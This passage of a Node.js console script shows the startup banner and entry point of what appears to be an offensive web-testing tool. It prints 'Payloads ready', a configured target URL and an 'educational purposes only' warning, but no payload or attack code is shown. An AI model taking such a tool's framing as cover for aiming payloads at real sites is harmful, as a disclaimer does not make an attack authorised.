    await new Promise(r => setTimeout(r, 300));
    console.log(`  ${C.green}[OK ]${C.reset} Configuration loaded`);
    await new Promise(r => setTimeout(r, 200));
    console.log(`  ${C.green}[OK ]${C.reset} Payloads ready`);
    await new Promise(r => setTimeout(r, 200));
    console.log(`  ${C.green}[OK ]${C.reset} Target: ${config.targetUrl}`);
    await new Promise(r => setTimeout(r, 200));
    console.log(`  ${C.yellow}[WARN]${C.reset} FOR EDUCATIONAL PURPOSES ONLY`);
    await new Promise(r => setTimeout(r, 500));
    console.log('');
    console.log(`  ${C.dim}Press Enter to access main menu...${C.reset}`);
    await ask('');
}

function typewriterEffect(text, delay = 15) {
    return new Promise(resolve => {
        let i = 0;
        const interval = setInterval(() => {
            process.stdout.write(text[i]);
            i++;
            if (i >= text.length) {
                clearInterval(interval);
                resolve();
            }
        }, delay);
    });
}

// ============================================
// MAIN ENTRY POINT
// ============================================
(async () => {
    await startupSequence();
    await mainMenu();
})();
